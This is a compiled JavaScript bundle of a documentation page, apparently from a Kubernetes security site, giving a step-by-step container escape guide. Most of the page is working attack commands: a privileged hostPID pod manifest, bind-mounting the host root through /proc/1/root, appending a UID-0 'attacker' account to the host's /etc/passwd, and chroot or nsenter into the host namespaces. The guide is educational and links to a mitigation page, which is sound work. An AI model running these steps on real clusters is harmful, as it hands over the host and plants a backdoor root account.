"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[6452],{2956:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>a,contentTitle:()=>c,default:()=>d,frontMatter:()=>r,metadata:()=>t,toc:()=>h});const t=JSON.parse('{"id":"attack_vectors/container_escape","title":"Container Escape Guide","description":"Step-by-step guide on breaking out of a container and gaining control over the host system.","source":"@site/docs/attack_vectors/container_escape.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/container_escape","permalink":"/k8s_security/docs/attack_vectors/container_escape","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/container_escape.md","tags":[],"version":"current","sidebarPosition":8,"frontMatter":{"sidebar_position":8,"title":"Container Escape Guide","description":"Step-by-step guide on breaking out of a container and gaining control over the host system."},"sidebar":"guidesSidebar","previous":{"title":"Privileged Containers","permalink":"/k8s_security/docs/attack_vectors/privileged_containers"},"next":{"title":"Insecure RBAC Permissions","permalink":"/k8s_security/docs/attack_vectors/insecure_rbac_permissions"}}');var o=n(4848),i=n(8453);const r={sidebar_position:8,title:"Container Escape Guide",description:"Step-by-step guide on breaking out of a container and gaining control over the host system."},c="Container Escape Guide",a={},h=[{value:"Prerequisites",id:"prerequisites",level:2},{value:"Step 1: Deploy a Test Pod with Required Privileges",id:"step-1-deploy-a-test-pod-with-required-privileges",level:2},{value:"Step 2: Identify the Container Environment",id:"step-2-identify-the-container-environment",level:2},{value:"Check the Container\u2019s Mount Namespace",id:"check-the-containers-mount-namespace",level:3},{value:"Step 3: Gain Access to the Host\u2019s Root Filesystem",id:"step-3-gain-access-to-the-hosts-root-filesystem",level:2},{value:"Step 4: Create a Root User on the Host",id:"step-4-create-a-root-user-on-the-host",level:2},{value:"Step 5: Escape to the Host\u2019s Root Namespace",id:"step-5-escape-to-the-hosts-root-namespace",level:2},{value:"Option 1: Use <code>chroot</code> to Change Root",id:"option-1-use-chroot-to-change-root",level:3},{value:"Option 2: Bind-Mount Necessary Filesystems",id:"option-2-bind-mount-necessary-filesystems",level:3},{value:"Option 3: Use <code>nsenter</code> to Enter the Host\u2019s Namespaces",id:"option-3-use-nsenter-to-enter-the-hosts-namespaces",level:3},{value:"Verify the Escape",id:"verify-the-escape",level:4},{value:"Conclusion",id:"conclusion",level:2}];function l(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(s.header,{children:(0,o.jsx)(s.h1,{id:"container-escape-guide",children:"Container Escape Guide"})}),"\n",(0,o.jsx)(s.p,{children:"This guide provides a detailed walkthrough of escaping from a container to gain full control over the host system. The process involves mounting the host's filesystem, modifying critical system files, and entering the host's namespaces."}),"\n",(0,o.jsx)(s.h2,{id:"prerequisites",children:"Prerequisites"}),"\n",(0,o.jsx)(s.p,{children:"To successfully escape from a container, the following conditions must be met:"}),"\n",(0,o.jsxs)(s.ul,{children:["\n",(0,o.jsxs)(s.li,{children:["The container must run as root (",(0,o.jsx)(s.code,{children:"runAsUser: 0"}),")."]}),"\n",(0,o.jsxs)(s.li,{children:[(0,o.jsx)(s.code,{children:"allowPrivilegeEscalation: true"})," must be enabled."]}),"\n",(0,o.jsxs)(s.li,{children:[(0,o.jsx)(s.code,{children:"hostPID: true"})," must be set to share the host\u2019s process namespace."]}),"\n",(0,o.jsxs)(s.li,{children:["The container must have access to ",(0,o.jsx)(s.code,{children:"/proc/1/root"}),", which exposes the host\u2019s root filesystem."]}),"\n",(0,o.jsxs)(s.li,{children:["The container must have permission to execute ",(0,o.jsx)(s.code,{children:"mount --bind"})," and ",(0,o.jsx)(s.code,{children:"chroot"}),"."]}),"\n",(0,o.jsxs)(s.li,{children:["The ",(0,o.jsx)(s.code,{children:"/proc"})," filesystem must be accessible from within the container."]}),"\n",(0,o.jsxs)(s.li,{children:["The container must be running in privileged mode (",(0,o.jsx)(s.code,{children:"privileged: true"}),")."]}),"\n"]}),"\n",(0,o.jsx)(s.h2,{id:"step-1-deploy-a-test-pod-with-required-privileges",children:"Step 1: Deploy a Test Pod with Required Privileges"}),"\n",(0,o.jsx)(s.p,{children:"To demonstrate container escape, use the following YAML file to create a privileged pod:"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-yaml",children:'apiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    run: test\n  name: test\nspec:\n  hostPID: true\n  containers:\n  - image: busybox\n    command: ["sleep", "infinity"]\n    securityContext:\n      runAsUser: 0\n      allowPrivilegeEscalation: true\n      privileged: true\n    name: test\n    resources: {}\n  dnsPolicy: ClusterFirst\n  restartPolicy: Always\nstatus: {}\n'})}),"\n",(0,o.jsx)(s.p,{children:"Apply the pod to the cluster:"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"kubectl apply -f test-pod.yaml\n"})}),"\n",(0,o.jsx)(s.h2,{id:"step-2-identify-the-container-environment",children:"Step 2: Identify the Container Environment"}),"\n",(0,o.jsx)(s.p,{children:"Before attempting to escape, check if the container is running with elevated privileges and if it has access to the host's filesystem."}),"\n",(0,o.jsx)(s.h3,{id:"check-the-containers-mount-namespace",children:"Check the Container\u2019s Mount Namespace"}),"\n",(0,o.jsx)(s.p,{children:"Run inside the container:"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"ls -l /proc/1/ns/mnt\n"})}),"\n",(0,o.jsx)(s.p,{children:"Example output:"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{children:"lrwxrwxrwx 1 root root 0 Mar 17 16:38 /proc/1/ns/mnt -> 'mnt:[4026535581]'\n"})}),"\n",(0,o.jsx)(s.p,{children:"This confirms that the container is isolated in a separate mount namespace from the host."}),"\n",(0,o.jsx)(s.h2,{id:"step-3-gain-access-to-the-hosts-root-filesystem",children:"Step 3: Gain Access to the Host\u2019s Root Filesystem"}),"\n",(0,o.jsxs)(s.p,{children:["If the container has access to ",(0,o.jsx)(s.code,{children:"/proc/1/root"}),", it may point to the actual root filesystem of the host."]}),"\n",(0,o.jsx)(s.p,{children:"Check if it exists:"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"ls /proc/1/root\n"})}),"\n",(0,o.jsx)(s.p,{children:"Expected output:"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{children:"bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var\nboot  etc  lib   lib64  media   opt  root  sbin  sys  usr\n"})}),"\n",(0,o.jsx)(s.p,{children:"If the output matches the expected host filesystem structure, proceed."}),"\n",(0,o.jsx)(s.p,{children:"Now, bind-mount the host\u2019s root filesystem inside the container:"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"mkdir /mnt/host\nmount --bind /proc/1/root /mnt/host\n"})}),"\n",(0,o.jsx)(s.p,{children:"Verify that the mount was successful:"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"ls /mnt/host\n"})}),"\n",(0,o.jsxs)(s.p,{children:["If you see ",(0,o.jsx)(s.code,{children:"/bin"}),", ",(0,o.jsx)(s.code,{children:"/etc"}),", ",(0,o.jsx)(s.code,{children:"/var"}),", ",(0,o.jsx)(s.code,{children:"/root"}),", etc., you have access to the host's filesystem."]}),"\n",(0,o.jsx)(s.h2,{id:"step-4-create-a-root-user-on-the-host",children:"Step 4: Create a Root User on the Host"}),"\n",(0,o.jsxs)(s.p,{children:["Now that we have access to the host\u2019s root filesystem, modify ",(0,o.jsx)(s.code,{children:"/etc/passwd"})," to create a root user."]}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"echo 'attacker:x:0:0::/root:/bin/bash' >> /mnt/host/etc/passwd\n"})}),"\n",(0,o.jsxs)(s.p,{children:["This adds a new user ",(0,o.jsx)(s.code,{children:"attacker"})," with UID 0 (root privileges)."]}),"\n",(0,o.jsx)(s.p,{children:"To verify:"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"cat /mnt/host/etc/passwd | grep attacker\n"})}),"\n",(0,o.jsx)(s.p,{children:"Expected output:"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{children:"attacker:x:0:0::/root:/bin/bash\n"})}),"\n",(0,o.jsx)(s.h2,{id:"step-5-escape-to-the-hosts-root-namespace",children:"Step 5: Escape to the Host\u2019s Root Namespace"}),"\n",(0,o.jsxs)(s.h3,{id:"option-1-use-chroot-to-change-root",children:["Option 1: Use ",(0,o.jsx)(s.code,{children:"chroot"})," to Change Root"]}),"\n",(0,o.jsx)(s.p,{children:"Now, attempt to switch to the host\u2019s root filesystem:"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"chroot /mnt/host /bin/sh\n"})}),"\n",(0,o.jsx)(s.p,{children:"If successful, running:"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"hostname\n"})}),"\n",(0,o.jsx)(s.p,{children:"should return the host\u2019s actual hostname."}),"\n",(0,o.jsxs)(s.p,{children:["If ",(0,o.jsx)(s.code,{children:"chroot"})," fails with:"]}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{children:'can\'t init_stub: Error { kind: Uncategorized, message: "no /proc/self/exe available. Is /proc mounted?" }\n'})}),"\n",(0,o.jsx)(s.p,{children:"or"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{children:"chroot: failed to run command '/bin/sh': No such file or directory\n"})}),"\n",(0,o.jsxs)(s.p,{children:["then the ",(0,o.jsx)(s.code,{children:"/proc"}),", ",(0,o.jsx)(s.code,{children:"/dev"}),", and ",(0,o.jsx)(s.code,{children:"/sys"})," filesystems must be mounted first."]}),"\n",(0,o.jsx)(s.h3,{id:"option-2-bind-mount-necessary-filesystems",children:"Option 2: Bind-Mount Necessary Filesystems"}),"\n",(0,o.jsxs)(s.p,{children:["If ",(0,o.jsx)(s.code,{children:"chroot"})," fails, first mount the required system files:"]}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"mount --bind / /mnt/host\nmount --bind /proc /mnt/host/proc\nmount --bind /sys /mnt/host/sys\nmount --bind /dev /mnt/host/dev\nmount --bind /run /mnt/host/run\n"})}),"\n",(0,o.jsxs)(s.p,{children:["Then, try ",(0,o.jsx)(s.code,{children:"chroot"})," again:"]}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"chroot /mnt/host /bin/sh\n"})}),"\n",(0,o.jsx)(s.p,{children:"If successful, you are now operating inside the host system."}),"\n",(0,o.jsxs)(s.h3,{id:"option-3-use-nsenter-to-enter-the-hosts-namespaces",children:["Option 3: Use ",(0,o.jsx)(s.code,{children:"nsenter"})," to Enter the Host\u2019s Namespaces"]}),"\n",(0,o.jsxs)(s.p,{children:["If ",(0,o.jsx)(s.code,{children:"chroot"})," still fails, forcefully enter the host\u2019s namespaces using ",(0,o.jsx)(s.code,{children:"nsenter"}),":"]}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh\n"})}),"\n",(0,o.jsxs)(s.ul,{children:["\n",(0,o.jsxs)(s.li,{children:[(0,o.jsx)(s.code,{children:"--target 1"})," \u2192 Targets PID 1 (which is ",(0,o.jsx)(s.code,{children:"systemd"})," or ",(0,o.jsx)(s.code,{children:"init"})," on the host)."]}),"\n",(0,o.jsxs)(s.li,{children:[(0,o.jsx)(s.code,{children:"--mount"})," \u2192 Joins the host\u2019s mount namespace."]}),"\n",(0,o.jsxs)(s.li,{children:[(0,o.jsx)(s.code,{children:"--uts"})," \u2192 Joins the host\u2019s UTS (hostname) namespace."]}),"\n",(0,o.jsxs)(s.li,{children:[(0,o.jsx)(s.code,{children:"--ipc"})," \u2192 Joins the host\u2019s inter-process communication namespace."]}),"\n",(0,o.jsxs)(s.li,{children:[(0,o.jsx)(s.code,{children:"--net"})," \u2192 Joins the host\u2019s network namespace."]}),"\n",(0,o.jsxs)(s.li,{children:[(0,o.jsx)(s.code,{children:"--pid"})," \u2192 Joins the host\u2019s process namespace, making ",(0,o.jsx)(s.code,{children:"ps aux"})," show all host processes."]}),"\n"]}),"\n",(0,o.jsx)(s.h4,{id:"verify-the-escape",children:"Verify the Escape"}),"\n",(0,o.jsx)(s.p,{children:"Run:"}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"hostname\n"})}),"\n",(0,o.jsxs)(s.p,{children:["Expected output: ",(0,o.jsx)(s.code,{children:"controlplane"})," (or another real hostname)."]}),"\n",(0,o.jsxs)(s.p,{children:["Check if the ",(0,o.jsx)(s.code,{children:"kubelet"})," process is visible:"]}),"\n",(0,o.jsx)(s.pre,{children:(0,o.jsx)(s.code,{className:"language-bash",children:"ps aux | grep kubelet\n"})}),"\n",(0,o.jsxs)(s.p,{children:["If you see ",(0,o.jsx)(s.code,{children:"kubelet"})," running, you have fully escaped the container and now control the host."]}),"\n",(0,o.jsx)(s.h2,{id:"conclusion",children:"Conclusion"}),"\n",(0,o.jsx)(s.p,{children:"You successfully escaped the container by:"}),"\n",(0,o.jsxs)(s.ol,{children:["\n",(0,o.jsxs)(s.li,{children:["Deploying a privileged pod with ",(0,o.jsx)(s.code,{children:"hostPID: true"}),"."]}),"\n",(0,o.jsx)(s.li,{children:"Mounting the host\u2019s root filesystem."}),"\n",(0,o.jsxs)(s.li,{children:["Adding a root user to ",(0,o.jsx)(s.code,{children:"/etc/passwd"}),"."]}),"\n",(0,o.jsxs)(s.li,{children:["Using ",(0,o.jsx)(s.code,{children:"chroot"})," or ",(0,o.jsx)(s.code,{children:"nsenter"})," to fully break out of container isolation."]}),"\n"]}),"\n",(0,o.jsx)(s.p,{children:"To learn how to prevent container escape vulnerabilities, refer to the mitigation guide:"}),"\n",(0,o.jsxs)(s.p,{children:["\u27a1 ",(0,o.jsx)(s.a,{href:"https://geek-kb.github.io/k8s_security/docs/best_practices/cluster_setup_and_hardening/pod_security/container_escape_mitigation/",children:"Preventing Container Escape"})]})]})}function d(e={}){const{wrapper:s}={...(0,i.R)(),...e.components};return s?(0,o.jsx)(s,{...e,children:(0,o.jsx)(l,{...e})}):l(e)}},8453:(e,s,n)=>{n.d(s,{R:()=>r,x:()=>c});var t=n(6540);const o={},i=t.createContext(o);function r(e){const s=t.useContext(i);return t.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function c(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:r(e.components),t.createElement(i.Provider,{value:s},e.children)}}}]);